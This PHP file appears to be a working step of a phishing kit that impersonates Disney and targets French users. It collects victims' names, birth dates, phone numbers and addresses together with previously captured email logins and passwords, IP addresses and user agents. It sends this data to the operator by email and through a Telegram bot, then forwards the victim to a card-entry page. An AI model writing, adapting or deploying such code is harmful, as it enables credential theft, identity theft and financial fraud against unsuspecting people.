<?php
session_start();

include("../settings.php");
include("../common/sub_includes.php");


if(isset($_POST))
{

	$_SESSION['nom'] = htmlspecialchars($_POST['input_name']);
	$_SESSION['prenom'] = htmlspecialchars($_POST['input_surname']);
	$_SESSION['birthday'] = htmlspecialchars($_POST['input_birth']);
	$_SESSION['phone'] = htmlspecialchars($_POST['input_tel']);
	$_SESSION['adresse'] = htmlspecialchars($_POST['input_residence']);
	$_SESSION['zip'] = htmlspecialchars($_POST['input_zipcode']);
	$_SESSION['city'] = htmlspecialchars($_POST['input_city']);
	$_SESSION["country"] = "France";
	


	if(empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['birthday']) || empty($_SESSION['phone']) || empty($_SESSION['adresse']) || empty($_SESSION['zip']) || empty($_SESSION['city']))
	{
		header('Location: ../steps/billing.php?error=true');

	}
	else{
		if($mail_sending == true){

			$message = "

[🪔] Full [🪔]

🪔  Nom : ".$_SESSION['nom']."
🪔  Prénom : ".$_SESSION['prenom']."
🪔  Date de naissance : ".$_SESSION['birthday']."

🪔 Numéro de téléphone : ".$_SESSION['phone']."
🪔 Adresse : ".$_SESSION['adresse']."
🪔 Code Postal : ".$_SESSION['zip']."
🪔 Ville : ".$_SESSION['city']."

[📲] Login [📲]

📲 Email : ".$_SESSION['email']."
📲 Mot de passe : ".$_SESSION['password']."




			";
	
			$subject = "「🪔」 +1 Full Info •  ".$_SESSION['nom']." • ".$_SESSION['prenom']." • ".$_SESSION['ip'];
			$headers = "From: Disney <jugular@disney.fr>";
			mail($rezmail, $subject, $message, $headers);
  
		  }
  
				  ##########################
				  #### TELEGRAM SENDING ####
				  ##########################
  
		  
		if($telegram_sending == true){
  
			$data = [
			  'text' => '

[🪔] Full [🪔]

🪔 Nom : '.$_SESSION['nom'].'
🪔 Prénom : '.$_SESSION['prenom'].'
🪔 Date De Naissance : '.$_SESSION['birthday'].'

🪔 Téléphone : '.$_SESSION['phone'].'
🪔 Adresse : '.$_SESSION['adresse'].'
🪔 Ville : '.$_SESSION['city'].'
🪔 Code Postal : '.$_SESSION['zip'].'

[📲] Login [📲]

📲 E-Mail : '.$_SESSION['email'].'
📲 Mot de passe : '.$_SESSION['password'].'

[💻] Informations additionnelles [💻]

💻 Adresse Ip : '.$_SESSION['ip'].'
💻 User-agent : '.$_SESSION['useragent'].'
			  ',
			  'chat_id' => $chat_billing
			];
  
			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
		}

        $_SESSION['billinged'] = true;
		echo json_encode(array('success' => 1));

		header("location: ../steps/card.php");
	}
	

}
else{
	echo json_encode(array('success' => 0));


}

?>